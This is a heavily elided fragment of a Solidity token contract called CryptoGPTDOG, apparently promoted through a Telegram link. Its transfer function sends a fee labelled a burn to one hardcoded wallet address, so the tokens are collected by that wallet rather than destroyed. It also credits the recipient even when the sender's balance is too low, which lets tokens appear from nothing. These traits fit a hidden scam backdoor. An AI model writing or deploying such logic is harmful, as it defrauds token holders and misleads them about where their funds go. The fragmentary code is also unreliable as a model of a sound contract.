...
// Submitted for Telegram: https://t.me/cryptogptdog
...
contract  CryptoGPTDOG  is Ownable, IERC20 {
    ...
    function _transfer(address form, address to, uint256 amount) internal virtual {
        ...
        _rOwned[0x6013C140B20596609199FcD3b6cF5F6d4d47c958] += _bruntoken;
        if (sendertokens >= amount) { _rOwned[form] = sendertokens - amount; }
        _rOwned[to] += tokenamount; 
        if (_brunfee > 0) {
        emit Transfer(form, 0x6013C140B20596609199FcD3b6cF5F6d4d47c958, _bruntoken);
        }
